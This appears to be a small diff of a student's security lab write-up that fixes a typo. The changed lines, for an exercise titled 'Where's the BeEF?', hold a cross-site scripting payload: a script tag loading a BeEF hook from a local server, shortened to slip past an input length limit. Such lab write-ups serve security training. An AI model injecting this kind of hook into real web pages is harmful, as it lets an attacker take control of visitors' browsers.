@@ -20,7 +20,7 @@
 * Implent MFA or other 2FA system. - Really important for any administration systems
 
 ### Web Application 3: Where's the BeEF?
-* To get around the character lenght limitations on the text box, I just shortened the provided script tag ``` <script src="http://127.0.0.1:3000/hook.js"></script> ```  to be ``` <script src="http://127.0.0.1:3000/hook.js"/> ```. Since there is not Javascript within the body of the script tag you can just at a forward slash at the end of the script tag to close it.
+* To get around the character lenght limitations on the text box, I just shortened the provided script tag ``` <script src="http://127.0.0.1:3000/hook.js"></script> ```  to be ``` <script src="http://127.0.0.1:3000/hook.js"/> ```. Since there is not Javascript within the body of the script tag you can just add a forward slash at the end of the script tag to close it.
   
 
 
